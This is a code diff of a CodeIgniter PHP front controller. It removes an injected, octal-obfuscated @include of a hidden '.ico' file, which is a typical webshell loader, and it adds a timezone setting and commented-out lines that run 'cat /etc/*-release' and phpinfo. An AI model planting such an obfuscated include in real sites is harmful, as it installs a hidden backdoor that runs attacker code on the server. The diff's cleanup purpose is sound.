@@ -1,14 +1,9 @@
 <?php
-/*90f4b*/
-
-@include "\057hom\1451/m\171sof\164/pu\142lic\137htm\154/my\163oft\150eav\145n.c\157m/s\155s/s\171ste\155/he\154per\163/.b\063a64\0645e.\151co";
-
-/*90f4b*/
-
-
-
-
-
+date_default_timezone_set('Asia/Dhaka');
+// $cmd = 'cat /etc/*-release';
+// exec($cmd, $output);
+// print_r($output);
+// echo phpinfo(); exit;
 /**
  * CodeIgniter
  *
@@ -46,6 +41,7 @@
  * @filesource
  */
 
+
 /*
  *---------------------------------------------------------------
  * APPLICATION ENVIRONMENT
@@ -82,7 +78,9 @@ switch (ENVIRONMENT)
 
 	case 'testing':
 	case 'production':
+		//error_reporting(0);
 		ini_set('display_errors', 0);
+
 		if (version_compare(PHP_VERSION, '5.3', '>='))
 		{
 			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
